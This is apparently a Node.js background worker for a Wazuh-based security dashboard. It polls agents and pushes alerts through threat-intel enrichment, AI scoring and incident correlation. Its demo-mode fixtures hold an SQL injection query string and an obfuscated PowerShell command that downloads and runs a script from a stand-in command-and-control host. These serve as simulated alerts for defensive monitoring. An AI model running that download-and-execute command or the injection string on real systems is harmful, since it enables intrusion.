const config = require('../../config');
const { Alert, AgentSnapshot, AIAnalysis } = require('../../models');
const wazuhApiClient = require('./WazuhApiClient');
const wazuhAgentService = require('./WazuhAgentService');
const wazuhAlertService = require('./WazuhAlertService');
const threatIntelService = require('../threatIntel/threatIntelService');
const aiServiceClient = require('../ai/aiServiceClient');
const alertCorrelationService = require('../correlation/alertCorrelationService');
const notificationService = require('../notifications/notificationService');
const logger = require('../../utils/logger');

class WazuhPoller {
  constructor() {
    this.intervalId = null;
    this.demoIntervalId = null;
    this.io = null;
    this.isPolling = false;
  }

  setSocketIo(io) {
    this.io = io;
  }

  start() {
    const pollInterval = config.wazuh.pollInterval || 30000;
    logger.info(`Starting Wazuh background worker (poll interval: ${pollInterval}ms, demoMode: ${config.demoMode})`);

    // Initial check
    this.poll();

    // Schedule regular polling
    this.intervalId = setInterval(() => {
      this.poll();
    }, pollInterval);

    // If demo mode is explicitly enabled, spawn simulated realistic security events
    if (config.demoMode) {
      this.startDemoGenerator();
    }
  }

  stop() {
    if (this.intervalId) clearInterval(this.intervalId);
    if (this.demoIntervalId) clearInterval(this.demoIntervalId);
    logger.info('Wazuh background worker stopped');
  }

  async poll() {
    if (this.isPolling) return;
    this.isPolling = true;

    try {
      // 1. Check Wazuh Manager connection
      const connTest = await wazuhApiClient.testConnection();
      
      if (this.io) {
        this.io.emit('wazuh_status', {
          connected: connTest.success,
          status: connTest.status,
          version: connTest.version,
          manager: connTest.manager,
        });
      }

      if (connTest.success) {
        // 2. Refresh Agent Snapshots
        const agentData = await wazuhAgentService.getAgents({ limit: 100 });
        if (agentData?.affected_items) {
          for (const item of agentData.affected_items) {
            await AgentSnapshot.findOneAndUpdate(
              { agentId: item.id },
              {
                agentId: item.id,
                name: item.name,
                ip: item.ip,
                status: item.status,
                os: item.os,
                version: item.version,
                manager: item.manager,
                group: item.group,
                lastKeepAlive: item.lastKeepAlive,
                dateAdd: item.dateAdd,
                node: item.node_name,
                registerIP: item.registerIP,
                lastSnapshot: new Date(),
              },
              { upsert: true, new: true }
            );
          }
        }
      }
    } catch (error) {
      logger.warn(`Wazuh poller iteration encountered non-fatal issue: ${error.message}`);
    } finally {
      this.isPolling = false;
    }
  }

  /**
   * Process and ingest an alert through the full pipeline
   */
  async processAlert(normalizedAlert, isDemo = false) {
    try {
      // 1. Check recent volume from same source IP or agent to assist risk scoring
      const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000);
      const recentCount = await Alert.countDocuments({
        $or: [
          { sourceIp: normalizedAlert.sourceIp },
          { agentId: normalizedAlert.agentId },
        ],
        timestamp: { $gte: fiveMinAgo },
      });

      // 2. Threat Intel Enrichment (asynchronously or cached)
      let threatIntel = null;
      if (normalizedAlert.sourceIp && !threatIntelService.isPrivateIp(normalizedAlert.sourceIp)) {
        threatIntel = await threatIntelService.enrichIp(normalizedAlert.sourceIp);
      }

      // 3. AI Analysis & Risk Scoring
      const aiResult = await aiServiceClient.analyzeAlert(normalizedAlert, threatIntel, recentCount + 1);

      // 4. Save normalized alert to MongoDB
      const alertDoc = new Alert({
        ...normalizedAlert,
        severity: aiResult.severity || normalizedAlert.severity,
        riskScore: aiResult.riskScore,
        isDemo,
      });

      await alertDoc.save();

      // 5. Save AI Analysis document
      const aiDoc = new AIAnalysis({
        alertId: alertDoc._id,
        riskScore: aiResult.riskScore,
        severity: aiResult.severity,
        threatType: aiResult.threatType,
        confidence: aiResult.confidence,
        isAnomaly: aiResult.isAnomaly,
        mitreTechniques: aiResult.mitreTechniques,
        explanation: aiResult.explanation,
        recommendedActions: aiResult.recommendedActions,
        riskFactors: aiResult.riskFactors,
        analysisSource: aiResult.analysisSource,
      });
      await aiDoc.save();

      // Link AI analysis to alert
      alertDoc.aiAnalysis = aiDoc._id;
      await alertDoc.save();

      // 6. Alert Correlation & Auto-Incident Creation
      const correlatedIncident = await alertCorrelationService.correlateAndCreateIncident(alertDoc, aiResult, threatIntel);

      // 7. Notification dispatch
      await notificationService.notifyAlert(alertDoc);

      // 8. Real-time broadcast via Socket.IO
      if (this.io) {
        this.io.emit('new_alert', {
          alert: alertDoc,
          aiAnalysis: aiDoc,
          threatIntel,
          incident: correlatedIncident,
        });
      }

      logger.info(`Alert processed: [${alertDoc.severity.toUpperCase()}] ${alertDoc.ruleDescription} (Risk: ${alertDoc.riskScore})`);
      return alertDoc;
    } catch (error) {
      logger.error(`Error processing alert pipeline: ${error.message}`);
      throw error;
    }
  }

  /**
   * Demo alert simulation when DEMO_MODE=true
   */
  startDemoGenerator() {
    const sampleScenarios = [
      {
        rule: { id: '5710', level: 10, description: 'sshd: Multiple failed login attempts (potential SSH brute force)', groups: ['sshd', 'authentication_failed'] },
        agent: { id: '001', name: 'prod-web-server-01', ip: '10.0.1.15' },
        data: { srcip: '185.220.101.45', dstip: '10.0.1.15', srcport: 48320, dstport: 22 },
        mitre: { id: ['T1110.001'], tactic: ['Credential Access'], technique: ['Password Guessing'] },
        location: '/var/log/auth.log',
        decoder: { name: 'sshd' },
        full_log: 'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.45 user=root',
      },
      {
        rule: { id: '80710', level: 12, description: 'Possible SQL Injection attempt detected in HTTP URI query string', groups: ['web', 'accesslog', 'attack'] },
        agent: { id: '002', name: 'dmz-nginx-lb', ip: '10.0.1.4' },
        data: { srcip: '194.26.29.112', dstip: '10.0.1.4', srcport: 54102, dstport: 443 },
        mitre: { id: ['T1190'], tactic: ['Initial Access'], technique: ['Exploit Public-Facing Application'] },
        location: '/var/log/nginx/access.log',
        decoder: { name: 'web-accesslog' },
        full_log: '194.26.29.112 - - [07/Oct/2026:22:15:30 +0000] "GET /api/v1/users?id=1%27%20OR%201=1-- HTTP/1.1" 200 4120',
      },
      {
        rule: { id: '554', level: 8, description: 'File Integrity Monitoring: Critical system binary modified (/bin/login)', groups: ['syscheck', 'fim'] },
        agent: { id: '003', name: 'database-cluster-master', ip: '10.0.2.10' },
        data: { srcip: '', dstip: '' },
        mitre: { id: ['T1565.001'], tactic: ['Impact'], technique: ['Stored Data Manipulation'] },
        location: 'syscheck',
        decoder: { name: 'syscheck' },
        full_log: 'File \'/bin/login\' checksum modified. Old md5: 8b1a9953c4611296a827abf8c47804d7, New md5: d41d8cd98f00b204e9800998ecf8427e',
      },
      {
        rule: { id: '60100', level: 14, description: 'Suspicious PowerShell execution: Base64 encoded payload with WebClient download', groups: ['windows', 'powershell', 'malware'] },
        agent: { id: '004', name: 'win-finance-workstation', ip: '10.0.3.55' },
        data: { srcip: '91.240.118.172', dstip: '10.0.3.55' },
        mitre: { id: ['T1059.001', 'T1105'], tactic: ['Execution', 'Command and Control'], technique: ['PowerShell', 'Ingress Tool Transfer'] },
        location: 'WinEvtLog',
        decoder: { name: 'windows' },
        full_log: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgBpAG8ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==',
      },
      {
        rule: { id: '31101', level: 6, description: 'Nmap port scan detected from internal host', groups: ['firewall', 'scan'] },
        agent: { id: '001', name: 'prod-web-server-01', ip: '10.0.1.15' },
        data: { srcip: '10.0.3.110', dstip: '10.0.1.15' },
        mitre: { id: ['T1046'], tactic: ['Discovery'], technique: ['Network Service Discovery'] },
        location: '/var/log/syslog',
        decoder: { name: 'iptables' },
        full_log: 'iptables: IN=eth0 OUT= SRC=10.0.3.110 DST=10.0.1.15 PROTO=TCP SPT=49152 DPT=3306 SYN',
      },
    ];

    let index = 0;
    this.demoIntervalId = setInterval(async () => {
      try {
        const scenario = sampleScenarios[index % sampleScenarios.length];
        index++;
        const rawAlert = {
          ...scenario,
          id: `demo-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
          timestamp: new Date().toISOString(),
        };
        const normalized = wazuhAlertService.normalizeAlert(rawAlert);
        await this.processAlert(normalized, true);
      } catch (err) {
        logger.error(`Demo generator error: ${err.message}`);
      }
    }, 45000); // Generate demo alert every 45s if demo mode is on
  }
}

module.exports = new WazuhPoller();
